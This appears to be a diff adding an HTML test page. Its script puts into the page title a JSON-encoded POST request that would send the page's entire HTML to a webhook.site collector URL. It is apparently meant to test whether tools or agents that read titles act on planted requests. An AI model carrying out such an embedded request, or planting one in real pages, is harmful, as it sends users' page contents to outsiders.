@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Set content script to title</title>
+</head>
+
+<body>
+    <script>
+        // Function to stringify a request object
+        function stringifyRequest(method, url, body, headers) {
+            return JSON.stringify({
+                method: method,
+                url: url,
+                body: body,
+                headers: headers
+            });
+        }
+
+        // Wait for 3 seconds and then set the title
+        setTimeout(function () {
+            var method = "POST";
+            var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
+            var body = JSON.stringify({
+                Contents: document.documentElement.innerHTML
+            });
+            var headers = {
+                "Content-type": "application/json; charset=UTF-8"
+            };
+
+            var requestString = stringifyRequest(method, url, body, headers);
+            document.title = requestString;
+        }, 3000);
+    </script>
+</body>
+
+</html>
